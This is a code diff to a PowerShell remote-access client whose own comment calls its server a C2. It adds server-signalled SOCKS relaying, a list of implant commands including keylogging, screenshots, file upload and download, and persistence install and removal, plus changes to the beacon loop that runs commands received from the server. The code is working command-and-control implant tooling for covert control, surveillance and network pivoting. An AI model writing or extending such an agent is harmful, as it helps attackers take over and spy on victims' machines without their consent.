@@ -562,10 +562,34 @@ function Parse-CmdResponse {
         elseif ($p.Name -match '^(?i)type$') { $typ = [string]$p.Value }
     }
     if ($null -eq $cmd) { $cmd = '' }
+    $socks = $false
+    foreach ($p in $response.PSObject.Properties) {
+        if ($p.Name -match '^(?i)socks_active$') {
+            $socks = [bool]$p.Value
+        }
+    }
     if ($null -eq $typ) {
         $typ = if ([string]::IsNullOrWhiteSpace($cmd)) { 'none' } else { 'execute' }
     }
-    return @{ command = $cmd; type = $typ }
+    return @{ command = $cmd; type = $typ; socks_active = $socks }
+}
+
+function Test-RmmInternalCommand {
+    param([string]$Line)
+    $c = $Line.Trim()
+    if (-not $c) { return $false }
+    if ($c -match '^(?i)__EXIT__$') { return $true }
+    if ($c -match '^(?i)__STOP__$') { return $true }
+    if ($c -match '^(?i)__CONFIG__\s') { return $true }
+    if ($c -match '^(?i)__DOWNLOAD__\s') { return $true }
+    if ($c -match '^(?i)__UPLOAD__') { return $true }
+    if ($c -match '^(?i)__SCREENSHOT__$') { return $true }
+    if ($c -match '^(?i)__KEYLOG__\s') { return $true }
+    if ($c -match '^(?i)__INSTALL_PERSIST__$') { return $true }
+    if ($c -match '^(?i)__REMOVE_PERSIST__$') { return $true }
+    if ($c -match '^(?i)__SOCKS_START__$') { return $true }
+    if ($c -match '^(?i)__SOCKS_STOP__$') { return $true }
+    return $false
 }
 
 # Text results include the originating command so the C2 can label output when the queue has many items.
@@ -579,6 +603,13 @@ function Send-RmmTextResult {
     $payload = [ordered]@{ rmm_cmd = $CommandLine; rmm_output = $Text }
     $json = $payload | ConvertTo-Json -Compress -Depth 10
     Invoke-RmmRestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
+}
+
+function Complete-RmmBeaconTurn {
+    param([hashtable]$Headers)
+    if ($script:RmmSocksEnabled) {
+        Invoke-RmmSocksCycle -Headers $Headers
+    }
 }
 
 function Stop-RmmSocksRelay {
@@ -952,8 +983,20 @@ while ($true) {
         
         # Invoke-RestMethod returns PSCustomObject for JSON; handle string or object
         $cmdData = Parse-CmdResponse -response $response
-        $command = [string]$cmdData.command
+        $command = ([string]$cmdData.command).Trim()
         $cmdType = [string]$cmdData.type
+        $socksActive = $false
+        if ($cmdData.socks_active -eq $true) { $socksActive = $true }
+
+        if ($socksActive) {
+            if (-not $script:RmmSocksEnabled) {
+                $script:RmmSocksEnabled = $true
+                Write-Host "[+] SOCKS relay active (signaled by server)" -ForegroundColor Green
+            }
+        } elseif ($script:RmmSocksEnabled) {
+            Stop-RmmSocksRelay
+            Write-Host "[*] SOCKS relay stopped (signaled by server)" -ForegroundColor Yellow
+        }
 
         if ($command -eq "__EXIT__") {
             Write-Host "[*] Session terminated by server; exiting client" -ForegroundColor Yellow
@@ -966,6 +1009,7 @@ while ($true) {
         if ($command -and $command -ne "") {
             if ($command -like "__CONFIG__ *") {
                 $null = Update-Configuration -configString $command
+                Complete-RmmBeaconTurn -Headers $headers
                 continue
             }
             Write-Host "[>] Received command: $command" -ForegroundColor Cyan
@@ -973,6 +1017,7 @@ while ($true) {
             # Handle special commands FIRST before anything else
             if ($command -eq "__STOP__") {
                 Write-Host "[*] Stopping persistent command" -ForegroundColor Yellow
+                Complete-RmmBeaconTurn -Headers $headers
                 continue
             }
             elseif ($command -like "__DOWNLOAD__ *") {
@@ -1146,14 +1191,12 @@ while ($true) {
                 Write-Host "[+] Persistence installed" -ForegroundColor Green
                 }
             }
-            elseif ($command -eq "__SOCKS_START__") {
+            elseif ($command -match '^(?i)__SOCKS_START__$') {
                 $script:RmmSocksEnabled = $true
-                Send-RmmTextResult -CommandLine '__SOCKS_START__' -Text 'SOCKS relay enabled on agent' -Headers $headers
                 Write-Host "[+] SOCKS relay enabled (fast beacon + /socks polls)" -ForegroundColor Green
             }
-            elseif ($command -eq "__SOCKS_STOP__") {
+            elseif ($command -match '^(?i)__SOCKS_STOP__$') {
                 Stop-RmmSocksRelay
-                Send-RmmTextResult -CommandLine '__SOCKS_STOP__' -Text 'SOCKS relay stopped on agent' -Headers $headers
                 Write-Host "[*] SOCKS relay stopped on agent" -ForegroundColor Yellow
             }
             elseif ($command -eq "__REMOVE_PERSIST__") {
@@ -1170,6 +1213,9 @@ while ($true) {
                 $result = "Persistence removed"
                 Send-RmmTextResult -CommandLine '__REMOVE_PERSIST__' -Text $result -Headers $headers
                 Write-Host "[+] Persistence removed" -ForegroundColor Green
+            }
+            elseif (Test-RmmInternalCommand -Line $command) {
+                Write-Host "[!] Unhandled internal command (ignored): $command" -ForegroundColor Yellow
             }
             else {
                 # CMD by default; PS:/powershell:/pwsh:/cmd: — see Invoke-RmmUserCommand
@@ -1188,9 +1234,7 @@ while ($true) {
             }
         }
 
-        if ($script:RmmSocksEnabled) {
-            Invoke-RmmSocksCycle -Headers $headers
-        }
+        Complete-RmmBeaconTurn -Headers $headers
         
     } catch {
         if (Test-RmmSessionTerminated -ErrorRecord $_) {
